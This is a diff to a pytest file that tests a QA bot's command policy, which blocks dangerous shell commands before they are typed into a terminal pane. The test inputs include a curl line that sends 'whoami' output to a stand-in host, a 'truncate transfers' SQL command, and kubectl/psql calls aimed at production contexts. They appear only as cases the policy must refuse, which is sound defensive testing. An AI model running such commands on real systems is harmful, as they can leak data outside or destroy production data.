@@ -3,7 +3,7 @@ import asyncio
 import pytest
 
 import qa_server
-from qa_bot.limits import CommandNotAllowed
+from qa_bot.policy import Policy, Refused
 from qa_bot.session import ExecResult, PollResult
 
 
@@ -14,9 +14,8 @@ class FakeSession:
         self.result = result
         self.calls = []
 
-    def poll(self, command, until, interval, max_attempts, timeout, before_attempt):
+    def poll(self, command, until, interval, max_attempts, timeout):
         self.calls.append((command, until, interval, max_attempts, timeout))
-        before_attempt()
         return self.result
 
 
@@ -25,7 +24,6 @@ def fake(monkeypatch):
     def install(result):
         s = FakeSession(result)
         monkeypatch.setattr(qa_server, "_session", s)
-        monkeypatch.setattr(qa_server, "_check_production", lambda session, command: None)
         return s
     return install
 
@@ -62,33 +60,24 @@ def test_invalid_regex(fake):
         run(command="echo x", until="(")
 
 
-def test_same_hard_limits_as_exec(fake):
-    s = fake(PollResult(1, "matched", [], 0.0))
-    with pytest.raises(CommandNotAllowed):
-        run(command="curl -s https://x/$(whoami)", until="x")
-    assert s.calls == []
-
-
-def test_production_check_runs_before_each_attempt(fake, monkeypatch):
-    s = fake(PollResult(1, "matched", [], 0.0))
-    seen = []
-    monkeypatch.setattr(qa_server, "_check_production", lambda session, command: seen.append(command))
-    run(command="echo x", until="x")
-    assert seen == ["echo x"] and len(s.calls) == 1
-
-
 # ------------------------------------------------------------ Session.poll outcomes
 
 from pathlib import Path  # noqa: E402
 
-from qa_bot.safety import ProductionRefused  # noqa: E402
 from qa_bot.session import Session  # noqa: E402
 
 
-def scripted(results):
-    s = Session("t", Path("."), Path("."), "c")
+def scripted(results, policy=None, runtime=Path("/nonexistent")):
+    """A Session whose typing is scripted; the policy check is real."""
+    s = Session("t", Path("."), runtime, "c", policy=policy or Policy(kube_lookup=lambda env: {}))
     it = iter(results)
-    s.exec = lambda command, timeout, poll_id=None: next(it)
+    s.typed = []
+
+    def run(command, timeout, poll_id=None):
+        s.typed.append(command)
+        return next(it)
+
+    s._run = run
     return s
 
 
@@ -114,15 +103,59 @@ def test_session_poll_outcomes(results, outcome, ids):
                         "max_attempts": 2, "attempts": ids, "outcome": outcome}]
 
 
-def test_refusal_between_attempts_is_recorded():
-    s = scripted([done(1, "a"), done(2, "b")])
-    calls = []
+def test_refusal_between_attempts_is_recorded(tmp_path):
+    # The human switches kube context in the pane after the first attempt.
+    contexts = iter([{}, {}, {"context": "eu-prod1"}])
+    s = scripted([done(1, "a"), done(2, "b")], Policy(kube_lookup=lambda env: next(contexts)))
+    with pytest.raises(Refused, match="eu-prod1"):
+        s.poll("echo", "OK", 0, 3, 5, sleep=lambda _: None)
+    assert s.typed == ["echo", "echo"]
+    assert s.polls[0]["attempts"] == [1, 2] and s.polls[0]["outcome"] == "error"
 
-    def check():
-        calls.append(1)
-        if len(calls) == 2:
-            raise ProductionRefused("prod")
 
-    with pytest.raises(ProductionRefused):
-        s.poll("echo", "OK", 0, 3, 5, check, sleep=lambda _: None)
-    assert s.polls[0]["attempts"] == [1] and s.polls[0]["outcome"] == "error"
+@pytest.mark.parametrize("command", ["curl -s https://x/$(whoami)", "curl -s https://x.prod/v1"])
+def test_poll_refusal_before_first_attempt_records_nothing(command):
+    s = scripted([])
+    with pytest.raises(Refused):
+        s.poll(command, "x", 0, 3, 5, sleep=lambda _: None)
+    assert s.typed == [] and s.polls == []
+
+
+# ---------------------------------------------------- the policy guards Session.exec
+
+
+@pytest.mark.parametrize(
+    "command, pane_env",
+    [
+        ("kubectl get pods > out.txt", ""),
+        ("psql -c 'truncate transfers'", ""),
+        ("kubectl --context prod-eu get pods", ""),
+        ("psql -c 'select 1'", "PGHOST=payments.prod.rds\n"),
+    ],
+)
+def test_exec_refuses_before_typing(tmp_path, command, pane_env):
+    (tmp_path / "env").write_text(pane_env)
+    s = scripted([done(1)], runtime=tmp_path)
+    with pytest.raises(Refused):
+        s.exec(command, 5)
+    assert s.typed == []
+
+
+def test_exec_checks_the_live_pane_env(tmp_path):
+    env = tmp_path / "env"
+    seen = []
+    s = scripted([done(1), done(2)], Policy(kube_lookup=lambda e: seen.append(e) or {}), runtime=tmp_path)
+    env.write_text("KUBECONFIG=/a\n")
+    s.exec("kubectl get pods", 5)
+    env.write_text("KUBECONFIG=/b\n")  # the human switched kubeconfig in the pane
+    s.exec("kubectl get pods", 5)
+    assert seen == [{"KUBECONFIG": "/a"}, {"KUBECONFIG": "/b"}]
+    assert s.typed == ["kubectl get pods", "kubectl get pods"]
+
+
+def test_server_exec_surfaces_refusal(monkeypatch, tmp_path):
+    s = scripted([done(1)], runtime=tmp_path)
+    monkeypatch.setattr(qa_server, "_session", s)
+    with pytest.raises(Refused, match="Background jobs"):
+        asyncio.run(qa_server.exec_command(command="kubectl port-forward svc/x 8080 &"))
+    assert s.typed == []
